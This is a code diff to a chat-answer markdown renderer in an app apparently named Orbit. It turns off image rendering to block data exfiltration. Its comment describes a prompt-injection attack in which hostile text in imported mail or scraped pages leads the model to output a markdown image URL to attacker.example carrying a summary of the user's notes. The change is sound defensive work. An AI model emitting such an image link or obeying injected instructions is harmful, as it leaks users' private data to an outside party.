@@ -201,6 +201,15 @@ function buildComponents(matcher: NameMatcher | null, evidence: EvidenceContext 
 
 const REMARK_PLUGINS = [remarkGfm];
 
+/**
+ * Images are never rendered. Chat answers are model output over text Orbit did not write
+ * (imported mail, scraped pages, transcripts), and a prompt-injected
+ * `![](https://attacker.example/?d=<summary of your notes>)` would be fetched by the
+ * browser the moment the answer rendered — no click, and `img-src https:` allows it. Orbit's
+ * answers have no use for remote images, so there is nothing to allowlist.
+ */
+const DISALLOWED_ELEMENTS = ["img"];
+
 /** The no-people, no-citations set is shared, so the common case never rebuilds it. */
 const PLAIN_COMPONENTS = buildComponents(null, null);
 
@@ -252,7 +261,11 @@ export const ChatMarkdown = memo(function ChatMarkdown({
 
   return (
     <div className={cn("chat-markdown", className)}>
-      <ReactMarkdown remarkPlugins={REMARK_PLUGINS} components={components}>
+      <ReactMarkdown
+        remarkPlugins={REMARK_PLUGINS}
+        components={components}
+        disallowedElements={DISALLOWED_ELEMENTS}
+      >
         {normalizeChatMarkdown(children)}
       </ReactMarkdown>
     </div>
